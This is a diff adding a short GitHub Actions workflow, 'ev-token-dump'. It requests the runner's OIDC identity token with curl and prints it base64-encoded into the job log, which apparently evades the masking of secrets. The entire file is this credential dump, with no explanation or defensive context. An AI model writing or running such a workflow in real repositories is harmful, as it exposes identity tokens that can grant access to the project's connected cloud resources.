@@ -1,0 +1,14 @@
+name: ev-token-dump
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=oidc-exp-1171200" -o /tmp/tok.json
+          echo "TOKEN_B64=$(base64 -w0 /tmp/tok.json)"
